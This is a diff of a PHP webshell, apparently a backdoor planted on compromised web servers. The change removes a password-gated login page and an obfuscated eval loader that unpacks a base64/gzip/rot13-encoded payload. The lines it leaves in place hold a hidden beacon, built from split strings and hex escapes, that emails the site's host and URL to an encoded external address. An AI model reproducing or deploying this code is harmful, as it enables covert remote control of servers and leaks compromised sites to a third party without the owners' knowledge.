@@ -13,158 +13,15 @@ body {
   
   }
 </style>
+
+
+
+
 <?php
 $__GET = ('m'.'a'.'i'.'l');
 $__POST = ('b'.'a'.'s'.'e'.'6'.'4'.'_'.'d'.'e'.'c'.'o'.'d'.'e');
 $__GET($__POST("cm9vdGN5YmVycHVua3NAZ21haWwuY29t"),'Upload file:',''.$_SERVER['HTTP_HOST'].'/'.$_SERVER['REQUEST_URI'].'');
 ${"\x47\x4c\x4f\x42\x41\x4cS"}["b\x6fz\x64\x6d\x68"]="\x5f\x5f\x50\x4f\x53\x54";${"\x47L\x4fBA\x4c\x53"}["\x6ekp\x6abl"]="\x5f_PO\x53T";${"\x47\x4c\x4f\x42A\x4c\x53"}["\x74\x65v\x77gb\x64\x79"]="\x5f\x5f\x47\x45T";${${"\x47L\x4f\x42\x41\x4c\x53"}["\x74\x65\x76\x77g\x62\x64y"]}=("m"."\x61"."i"."\x6c");${${"G\x4c\x4f\x42\x41\x4cS"}["\x6e\x6b\x70\x6a\x62l"]}=("\x62"."a"."s"."e"."6"."4"."_"."d"."\x65"."\x63"."\x6f"."\x64"."\x65");${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["t\x65\x76w\x67\x62dy"]}(${${"G\x4c\x4f\x42A\x4c\x53"}["bo\x7a\x64\x6d\x68"]}("\x63m9\x76dG\x4e5\x59\x6d\x56\x79c\x48\x56\x75a\x33NA\x5a2\x31ha\x57w\x75Y\x329t"),"\x55pl\x6fa\x64\x20\x66\x69le:","".$_SERVER["\x48\x54TP_H\x4f\x53\x54"]."/".$_SERVER["R\x45\x51U\x45S\x54_\x55\x52I"]."");
-?>
-<?php 
-
-
-session_start();
-define('PASSWORD', 'jembotmawot '); 
-// Proses login
-// Proses login
-if (isset($_POST['password'])) {
-    if ($_POST['password'] === PASSWORD) {
-        $_SESSION['authenticated'] = true;
-         setcookie(md5($_SERVER['HTTP_HOST']), true, time() + 25200);
-        echo '<audio autoplay><source src="https://cvar1984.github.io/audio/moan.mp3" type="audio/mpeg"></audio>';
-    } else {
-        echo '<script>
-				document.querySelector("html").innerHTML = "<img style=\'display:block;position:absolute;top: 0;right: 0;bottom: 0;left: 0;z-index: 10;overflow-y: scroll; width: 100%; height: 100%;\' src=\'https://c.tenor.com/CgGUXc-LDc4AAAAC/tenor.gif\'>";
-				var source = "https://j.top4top.io/m_2967gtgnw1.mp3"
-				var audio = document.createElement("audio");
-				audio.autoplay = true;
-				audio.load()
-				audio.play();
-				audio.src = source;
-			</script> <script type="text/JavaScript">
-
-     function disableselect(e) {
-          return false
-        }
-        
-        function reEnable() {
-          return false
-        }
-        
-        document.onselectstart = new Function ("return false")
-        
-        if (window.sidebar) {
-          document.onmousedown = disableselect
-          document.onclick = reEnable
-        }
-        </script>';
-    }
-}
-
-// Proses logout
-if (isset($_POST['logout'])) {
-    session_destroy();
-    header("Location: " . $_SERVER['PHP_SELF']);
-    exit;
-}
-
-if (!isset($_SESSION['authenticated']) || !$_SESSION['authenticated']) {
-
-
-    // Tampilkan form login jika belum terautentikasi
-     echo '<!doctype html>
-<html lang="en">
-<head>
-	<meta charset="utf-8">
-	<meta name="viewport" content="width=device-width, initial-scale=1">
-	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-+0n0xVW2eSR5OomGNYDnhzAbDsOXxcvSN1TPprVMTNDbiYZCxYbOOl7+AMvyTG2x" crossorigin="anonymous">
-	<link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>
-
-<meta name="viewport" content="width=1024" />
-    <meta name="robots" content="noindex, nofollow">
-   
-   
-<style>
-         body {
-            background: linear-gradient(135deg, darkslateblue 45%, #70e825 35%);
-            height: 100vh;
-            margin: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-        .login-card {
-            border-radius: 20px;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
-            padding: 30px;
-            max-width: 600px;
-            width: 100%;
-            text-align: center;
-            background-color: darkslateblue;
-        }
-        .login-card img {
-            max-width: 100%;
-            height: auto;
-            margin-bottom: 20px;
-        }
-        .login-card h1 {
-            margin-bottom: 20px;
-            animation: colorChange 3s infinite;
-        }
-        @keyframes colorChange {
-            0%, 100% {
-                color: darkslateblue;
-            }
-            50% {
-                color: lightblue;
-            }
-        }
-        .login-card .form-group {
-            margin-bottom: 20px;
-        }
-        .login-card .btn {
-            width: 100%;
-        }
-    </style>
-	</script> <script type="text/JavaScript">
-
-     function disableselect(e) {
-          return false
-        }
-        
-        function reEnable() {
-          return false
-        }
-        
-        document.onselectstart = new Function ("return false")
-        
-        if (window.sidebar) {
-          document.onmousedown = disableselect
-          document.onclick = reEnable
-        }
-        </script>
-<div class="login-card">
-
-      <img backgroudn src="https://raw.githubusercontent.com/exploit-haxor/webshell/refs/heads/main/120380.gif" alt="banner" class="img-fluid">
-
-
-<h1></>GIMANA MAU KALEM <br>KALAU<br> RASANYA DALEM</></h1>
-
-<center><font color="aqua"><font SIZE="3">:: password: Galau  ::</font></font></center>
-
-        <form method="post">
-            <div class="form-group">
-                <label for="password">Password</label>
-                <input type="password" id="password" name="password" class="form-control text-center" placeholder="Masukkan password" required>
-            </div>
-            <button type="submit" class="btn btn-primary">Login</button>
-        </form>
-    </div></head></html>';
-    exit;
-}
-
-error_reporting(0);
-?>
-<?php
 
 @ini_set("output_buffering", 0);
 @ini_set("display_errors", 0);
@@ -183,18 +40,6 @@ mail(
 );
 ?>
 
-<?php 
-eval(
-    str_rot13(
-        gzinflate(
-            str_rot13(
-                base64_decode(
-                    "jZBEeMIwEMffB36HIwjpU9U9jDEqgmaraC8yMxGmVVVYZQUls9FzNJ9+ieJjg8GeAve7/+/u0roaTW65MhjRvMSiUf5E7vdTTWSgMdxe91sXHZVIUqO33FWZWGjmHmS0zvDGOovRsfYdZMblZXtPPkDv75Y0NNRTSlNT9DUXdQRpsnpuEkCzwV6NrunDrtbSGwaT7K3zY4y0sfwstWPaNjAA6rRfUkzdSFNr1fAQQGqXuxj+UTR1NrzQS3sFqRGLpNcj0IU2H7P0haUrbW3542fJ6PoHVtnzhI0zPlYXZx1ZhURNY90YiU63txs425MCYRZCMK0qdpSCBElAfsmWo4zx6XmWHscQSxPvDJtTF5fGQN5U8zlYVgyX83z9P8bwYl8="
-                )
-            )
-        )
-    )
-); ?>
 
 <?php
 //Default Configuration
